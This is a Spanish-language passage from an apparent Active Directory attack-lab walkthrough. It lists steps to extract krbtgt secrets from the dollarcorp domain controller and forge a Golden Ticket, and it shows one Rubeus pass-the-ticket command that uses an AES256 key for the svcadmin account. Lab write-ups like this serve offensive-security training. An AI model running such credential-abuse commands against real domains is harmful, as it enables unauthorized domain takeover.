
## Tareas
- [ ] Extraer los *secrets* del controlador de domino de *dollarcorp*
- [ ] Usar los *secrets* de la cuenta *krbtgt* para crear un *Golden Ticket*
- [ ] Usar el *Golden Ticket* para obtener privilegios de administrador de dominio desde una maquina

**Flag 16: Hash NTLM de krbtgt**
**Flag 17: Hash NTLM del Domain Admin - Administrator**


## Extraer secrets del Domain Controller de *dollarcorp*

Como en nel laboratorio anterior acabamos con privilegios de administrador de dominio

Empezaremos abruiendo una ventana como Administrador de Dominio e iuniciaremos un nuevo proceso como *svcadmin*
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Se nos creara una terminal con usuario administrador, ahora tendremos que copiar el *Loader.exe* a la maquina *dcorp-dc*

